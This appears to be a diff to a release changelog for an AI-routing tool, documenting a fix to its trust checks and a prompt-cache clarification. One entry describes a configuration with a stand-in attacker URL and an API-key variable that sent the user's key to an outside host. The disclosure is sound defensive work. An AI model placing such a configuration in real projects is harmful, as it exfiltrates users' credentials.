@@ -108,6 +108,17 @@ Also in this release:
   endpoints and trusted surfaces (`gnomon trust grant`, `--trust`,
   `GNOMON_TRUST`) behave as before. Present in every release before 0.5.0.
   CONTRACTS.md §8, "Keys before (or without) a session".
+- **A role's `[roles.<name>.escalate]` key is judged and clamped like a
+  `fallback`'s.** The escalate block (new in this release, #180) can name its
+  own `url` and `api_key_env`; the trust step did not look at it, so an
+  untrusted surface with `url = "https://attacker.example/…"` and
+  `api_key_env = "ANTHROPIC_API_KEY"` in that block was not shown as a grant
+  and, on the first trigger, sent your key to that host. It is now the grant
+  `key:<role>.escalate:<VAR>@<host>`, and a clamped surface sends the
+  escalated request without the key. For `escalate` and `fallback` alike, the
+  host judged is the one the request goes to: an inline `api_key_env` beside
+  `endpoint = "<name>"` is judged at that endpoint's host (before, only a
+  `url` in the block was). CONTRACTS.md §8 and §42.
 - **WebSearch under `[sandbox] network = false` is refused (rule `network`)
   for every role** by `gnomon guard`. Before, a role without webfetch (the
   `gnomon init` roles, on the `gnomon init` surface) got an approvable
@@ -570,7 +581,9 @@ Nothing changes unless declared; daily-dev defaults are untouched.
 - Never sent to OpenAI's or DeepSeek's own APIs, Ollama's `/api/chat`, or any
   target whose model id does not name Claude: those request bodies are
   master's, byte for byte. `[endpoints.<name>] prompt_cache = false` opts out;
-  `true` opts in a gateway whose model alias hides the family.
+  `true` opts in a gateway whose model alias hides the family. The endpoint's
+  setting holds wherever it is reached: as a role's target, its `fallback`, or
+  its `[roles.<name>.escalate]` route.
 - An endpoint that answers 400 naming `cache_control` is sent the call once
   more without markers and gets none for the rest of the process:
   `counters.prompt_cache_refused`, one stderr line. The turn record's `wire`
